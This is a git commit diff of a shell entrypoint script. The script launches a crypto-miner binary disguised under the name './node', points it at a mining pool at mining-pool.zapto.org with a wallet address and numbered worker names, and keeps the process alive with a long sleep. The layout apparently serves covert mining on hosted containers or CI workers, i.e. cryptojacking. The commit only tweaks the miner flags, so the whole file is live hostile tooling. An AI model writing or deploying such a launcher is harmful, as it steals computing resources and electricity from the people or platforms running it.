3e1b4ba7e6ebf1040f31c17408bb82e6817b46a0
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-03 04:25:22 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -6,6 +6,6 @@ WORKER_NUMBER=$1
 HOURESX=crf_$WORKER_NUMBER
 PASSHOURS=$(date +%M%S)
 #./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
-./node -a yescryptr16 -o mining-pool.zapto.org:3735 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${HOURESX} > try.log
+./node --disable-gpu -a yescryptr16 -o mining-pool.zapto.org:3735 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${HOURESX} > try.log
 sleep 29999
 
